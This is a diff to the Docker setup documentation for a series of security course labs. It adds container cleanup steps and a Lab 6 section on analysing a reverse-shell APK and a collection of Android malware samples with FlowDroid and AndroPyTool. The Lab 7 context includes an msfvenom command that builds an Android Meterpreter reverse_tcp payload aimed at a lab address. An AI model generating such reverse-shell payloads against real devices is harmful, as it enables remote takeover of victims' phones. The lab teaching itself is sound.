@@ -184,7 +184,14 @@ Remove all local images:
 $ docker rmi $(docker images -a -q)
 ```
 
-## For each lab
+Open a shell on a running container named `container-name`
+
+```
+$ docker exec -it container-name /bin/bash
+```
+
+
+## For Each Lab
 
 ### Lab 3
 
@@ -194,6 +201,12 @@ $ docker rmi $(docker images -a -q)
 
 ```
 $ docker run -it yangzhou301/lab3
+```
+
+- After lab ends, exit and remove the container:
+
+```
+$ docker rm $(docker ps -qa --no-trunc --filter "status=exited")
 ```
 
 ### Lab 4
@@ -207,17 +220,75 @@ $ docker run -it yangzhou301/lab3
 $ docker run -it --volume=<your-path>:/usr/src/app yangzhou301/lab4
 ```
 
+- After lab ends, exit and remove the container:
+
+```
+$ docker rm $(docker ps -qa --no-trunc --filter "status=exited")
+```
+
+### Lab 6
+
+- Dockerfile: {Download}`lab6/Dockerfile`
+- Remote: [yangzhou301/lab6](https://hub.docker.com/repository/docker/yangzhou301/lab6)
+- Shared Folder: `/apks`(container)
+- Command:
+
+
+Start the container with specifying `~/lab6-apks`(empty) on your local machine as the shared folder with the container
+
+```
+$ docker run -it -v ~/lab6-apks:/apks yangzhou301/lab6
+```
+
+`reverse_tcp.apk` created in Lab 7 has been placed in `/root/lab7`, to analyze it by FlowDroid, run
+
+```
+# java -jar soot-infoflow-cmd-jar-with-dependencies.jar -a lab7/reverse_tcp.apk -p $ANDROID_HOME/platforms/ -s SourcesAndSinks.txt
+```
+
+Use [AndroPyTool](https://alexmyg.github.io/AndroPyTool/) to detect it thoroughly (copy your [VirusTotal](https://www.virustotal.com/) API key as `<api-key>`):
+
+```
+# cd AndroPyTool
+# python -u /root/AndroPyTool/androPyTool.py -all -s /root/lab7 -vt <api-key>
+```
+
+you can read the reports in `/root/lab7` by `cat` commands.
+
+Besides, malicious `apk`s in the collection of [android-malware](https://github.com/ashishb/android-malware) are extracted in `/root/malwares`, if you are interested in analyzing their behaviors by AndroPyTool, run 
+
+```
+# python -u /root/AndroPyTool/androPyTool.py -all -s /root/malwares -vt <api-key>
+```
+
+If you have other `apk`s to analyze, put them into the shared directory `~/lab6-apks` and run
+
+```
+# python -u /root/AndroPyTool/androPyTool.py -all -s /apks -vt <api-key>
+```
+
+Then you can view the reports in this directory locally.
+
+After all jobs done, remove the container:
+
+```
+$ docker rm $(docker ps -qa --no-trunc --filter "status=exited")
+```
+
+
+
 
 
 ### Lab 7
 
-In this lab, it contains three containers`docker-compose`
+In this lab, it contains three containers organized by a `docker-compose` file.
 
 - Compose File: {Download}`lab7/docker-compose.yml`
 - Dockerfile(Attacker): {Download}`lab7/Dockerfile`
 - Remote(Attacker):  [yangzhou301/lab7](https://hub.docker.com/repository/docker/yangzhou301/lab7)
 - Command
   - Start Docker Compose:
+
 ```sh
 # work in lab7 directory
 $ cd lab7
@@ -246,7 +317,7 @@ msf> msfvenom -p android/meterpreter/reverse_tcp LHOST=10.9.0.7 LPORT=4444 -f ra
 msf> set lhost 10.9.0.7
 ```
 
-## Lab 8
+### Lab 8
 
 This lab runs on an android emulator docker all the time.
 
